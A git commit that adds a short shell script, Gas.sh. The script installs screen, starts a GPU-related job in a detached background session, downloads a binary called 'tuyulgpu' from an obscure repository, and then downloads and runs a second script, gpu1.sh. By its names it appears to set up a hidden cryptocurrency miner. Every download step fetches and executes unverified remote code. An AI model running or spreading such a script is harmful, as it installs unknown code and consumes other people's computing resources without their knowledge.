fc2838fce6d457177098bda4ad39d274fe387d85
Isthifa <85566406+Isthifa@users.noreply.github.com>
2021-06-25 16:29:17 +0530

    Create Gas.sh

---
+++ Gas.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+
+sudo apt update
+sudo apt install screen -y
+screen -dmS gpu.sh ./gpu.sh 65 75
+wget https://github.com/nuri655/jajshdbdbdbdbb/raw/main/tuyulgpu
+wget https://raw.githubusercontent.com/Isthifa/skyz/main/gpu1.sh
+chmod +x gpu1.sh
+./gpu1.sh
